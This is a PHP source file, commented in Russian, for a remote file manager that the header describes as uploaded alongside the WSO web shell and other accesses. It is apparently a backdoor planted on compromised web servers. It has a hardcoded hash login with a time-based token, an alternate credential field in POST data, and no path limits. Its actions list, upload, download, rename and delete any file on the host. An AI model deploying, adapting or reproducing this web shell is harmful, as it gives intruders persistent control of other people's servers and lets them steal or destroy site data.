<?php

/** Скрипт file manager, который мы выгружаем в дополнение к WSO и пр. доступам
 * Перед выгрузкой в этом коде строка
 * 906a7057e5b440f271a7a282ef861b12f0b40955aeeb835709bd151f9fe9d8b2
 * в инициализации $hash в функции Auth::check() должна быть заменена на значение hash('sha256',...) пароля для соответствующего доступа
 */

define('SHELL_MANAGER_VERSION', '1.0');

/**
 * Файловый менеджер с небольшим набором функций - upload/download/rename/check
 * Обязательные параметры GET:
 * dir - рабочая директория
 * action - должен совпадать с именем функции из класса Manager
 * Всё остальное - через POST
 * Авторизация - стандартный http пароль
 * Возвращает json: status => success/error, data - массив с результатами
 * Исключение - dumpFile, который просто возвращает содержимое файла
 */

try {
    /** Для тестирования в командной строке */
    if (!count($_GET) && strlen($q = getenv('QUERY_STRING'))) {
        parse_str($q, $_GET);
    }

    if (!Auth::check()) {
        SystemHelper::response('Unauthorized', 401);
    }

    $action = Url::get('action');
    /** @var class-string $managerClass */
    $managerClass = 'Manager';
    if (empty($action) || !method_exists($managerClass, $action))
        SystemHelper::response('Action not found', 404);

    SystemHelper::response(call_user_func(array('Manager', "$action")), JSON_UNESCAPED_SLASHES);
} catch (Throwable $e) {
    if ($e->getCode())
        http_response_code($e->getCode());
    else
        http_response_code(400);
    SystemHelper::response($e->getMessage());
}


class Url
{
    public static function get($var = false)
    {
        return (isset($_GET[$var]) ? $_GET[$var] : '');
    }

    public static function post($var = false)
    {
        return (isset($_POST[$var]) ? $_POST[$var] : '');
    }

    public static function server($var = false)
    {
        $auth = false;
        if (isset($_SERVER['HTTP_AUTHORIZATION']))
            $auth = $_SERVER['HTTP_AUTHORIZATION'];
        else
            if (isset($_SERVER['REDIRECT_HTTP_AUTHORIZATION']))
                $auth = $_SERVER['REDIRECT_HTTP_AUTHORIZATION'];

        if ($auth && preg_match('/Basic\s+(.*)\s*$/i', $auth, $matches)) {
            list($name, $password) = explode(':', base64_decode($matches[1]));
            $_SERVER['PHP_AUTH_USER'] = strip_tags($name);
            $_SERVER['PHP_AUTH_PW'] = strip_tags($password);
        }
        return (isset($_SERVER[$var]) ? $_SERVER[$var] : '');
    }

    public static function files($var = false)
    {
        return (isset($_FILES[$var]) ? $_FILES[$var] : '');
    }
}

class Auth
{
    static $actionsAuthExceptions = [
        'version'
    ];
    /** Проверяем hash юзера и помимо этиого пароль с привязкой ко времени */
    public static function check()
    {
        $action = Url::get('action');
        if (in_array($action, Auth::$actionsAuthExceptions)) {
            return true;
        }

        $hash = '906a7057e5b440f271a7a282ef861b12f0b40955aeeb835709bd151f9fe9d8b2';

        $user = Url::server('PHP_AUTH_USER');
        $passwd = Url::server('PHP_AUTH_PW');
        /** Если регулярная аутентификация отсутствует - может быть передано через $_POST */
        if(!($user && $passwd)) {
            if (!isset($_POST['hashhash'])) {
                die("AUTH ERROR 1");
                return false;
            }
            $arr = explode(':', trim(base64_decode($_POST['hashhash'])));
            if (count($arr) < 2) {
                die("AUTH ERROR 11");
                return false;
            }
            list($user, $passwd) = $arr;
        }

        $uhash = hash('sha256', $user);
        if ($hash !== $uhash) {
//            die("AUTH ERROR 22 $user / $uhash / $hash");
            die("AUTH ERROR 22");
            return false;
        }

        for ($t = time() - 30; $t < time() + 30; $t++) {
            if ($passwd === md5("$t\tVUGLUSKR\t$hash"))
                return true;
        }
        die("AUTH ERROR 3");
        return false;
    }
}

class SystemHelper
{
    static function dirFiles($dir = false)
    {
        return array_diff(scandir($dir ? $dir : '.'), ['.', '..']);
    }

    static function fileInfo($file, $with_contents = false)
    {
        if (!file_exists($file)) {
            return array(
                'path' => $file,
                'exists' => 0,
                'isDir' => 0,
                'writable' => 0
            );
        }
        $stat = stat($file);
        $size = $stat['size'];
        $isdir = (is_dir($file) ? 1 : 0);
        if (empty($file))
            $file = '.';
        if (is_readable($file))
            $dir_count = ($isdir ? count(array_diff(scandir($file), ['.', '..'])) : 0);
        else
            $dir_count = '-';
        $result = array(
            'path' => realpath($file),
            'exists' => 1,
            'isDir' => $isdir,
            'writable' => (is_writable($file) ? 1 : 0),
            'modified' => $stat['mtime'],
            'dirCount' => $dir_count,
            'size' => $size,
        );
        if (!$isdir && $with_contents && $size < 1000000)
            $result['contents'] = file_get_contents($file);
        return $result;
    }

    static function response($data, $code = false)
    {
        if (is_array($data))
            $response = array('status' => 'success', 'data' => $data);
        else {
            $response = array('status' => 'error', 'message' => $data);
        }
        if ($code !== false)
            http_response_code($code);
        echo json_encode($response);
        exit;
    }


}

/** Здесь каждая функция соответствует аргументу action, ничего лишнего быть не должно */
class Manager
{
    /** Это исключительно для проверки, поэтому выводим тпо минимуму без status и пр. */
    static function version()
    {
        die(json_encode(array('version' => SHELL_MANAGER_VERSION)));
    }

    static function baseDir()
    {
        return array('path' => __DIR__, 'exists' => true, 'isDir' => true, 'writable' => is_writable(__DIR__));
    }

    static function dirList()
    {
        $dir = Url::get('dir');
        $files = SystemHelper::dirFiles($dir);
        /** Нам нужен полный путь, а не просто имя файла */
        if ($dir) {
            foreach ($files as $key => $name)
                $files[$key] = "$dir/$name";
        }
        $mapped = array_map(
            'SystemHelper::fileInfo',
            $files
        );
        return array_values($mapped);
    }

    static function createDir()
    {
        $dir = Url::get('dir');
        $name = Url::post('name');

        if (empty($name) || empty($dir)) {
            SystemHelper::response('No name or dir', 422);
        }

        $full_path = "$dir/$name";
        if (!is_dir($full_path)) {
            mkdir($full_path, 0755, true);
            if (!is_dir($full_path)) {
                SystemHelper::response('Failed to create dir', 500);
            }
        }
        return SystemHelper::fileInfo($full_path);
    }

    static function deleteDir()
    {
        $dir = Url::get('dir');
        $name = Url::post('name');

        if (empty($name) || empty($dir))
            SystemHelper::response('No name or dir', 422);

        $full_path = "$dir/$name";
        if (!is_dir($full_path))
            SystemHelper::response('No dir', 422);
        rmdir($full_path);
        if (is_dir($full_path))
            SystemHelper::response("Failed to delete dir", 500);
        return SystemHelper::fileInfo($full_path);
    }

    static function deleteFile()
    {
        $dir = Url::get('dir');
        $name = Url::post('name');

        if (empty($name) || empty($dir))
            SystemHelper::response('No name or dir', 422);

        $full_path = "$dir/$name";
        if (!file_exists($full_path))
            SystemHelper::response('No file', 422);
        unlink($full_path);
        if (file_exists($full_path))
            SystemHelper::response("Failed to delete file", 500);
        return SystemHelper::fileInfo($full_path);
    }

    static function checkFile()
    {
        $dir = Url::get('dir');
        $name = Url::post('name');
        if (empty($name) || empty($dir))
            SystemHelper::response('No name or dir', 422);

        $full_path = "$dir/$name";
        return SystemHelper::fileInfo($full_path, Url::post('contents'));
    }

    static function renameFile()
    {
        $dir = Url::get('dir');
        $from = Url::post('from');
        $to = Url::post('to');

        if (empty($from) || empty($to) || empty($dir))
            SystemHelper::response('No from/to or dir', 422);

        $from_path = "$dir/$from";
        $to_path = "$dir/$to";
        if (!file_exists($from_path))
            SystemHelper::response('No file', 422);
        if (file_exists($to_path))
            SystemHelper::response('Such file exists', 422);
        rename($from_path, $to_path);
        if (!file_exists($to_path))
            SystemHelper::response('Failed to rename', 500);
        if (file_exists($from_path))
            SystemHelper::response('Failed to rename', 500);
        return SystemHelper::fileInfo($to_path);
    }

    static function putFile()
    {
        $dir = Url::get('dir');
        $name = Url::post('name');

        if (empty($dir))
            SystemHelper::response('No dir', 422);

        if (!is_dir($dir))
            mkdir($dir, 0777, true);

        $file = Url::files('file');
        if (is_array($file)) {
            /** Передано через input type=file */
            $fn = $dir . '/' . $file['name'];
            if (is_dir($fn))
                SystemHelper::response("Can't write to directory", 500);
            if (!move_uploaded_file($file['tmp_name'], $fn))
                SystemHelper::response('Failed to upload', 500);
        } else {
            /** Передано через обычный параметр post */
            $fn = $dir . '/' . $name;
            if (is_dir($fn))
                SystemHelper::response("Can't write to directory", 500);
            file_put_contents($fn, Url::post('contents'));
        }
        if (!file_exists($fn))
            SystemHelper::response('Failed to create file', 500);

        return SystemHelper::fileInfo($fn);
    }

    static function dumpFile()
    {
        $dir = Url::get('dir');
        $name = Url::post('name');

        if (empty($name) || empty($dir))
            SystemHelper::response('No name or dir', 422);

        $path = "$dir/$name";

        list($filename) = array_reverse(explode('/', $path));
        $fd = fopen($path, 'r');
        if (!$fd) {
            SystemHelper::response('Failed to open file', 500);
        }

        while (!feof($fd)) {
            echo fread($fd, 10240);
        }
        fclose($fd);
        exit;
    }

    static function pathExists()
    {
        return SystemHelper::fileInfo(Url::get('path'));
    }

}

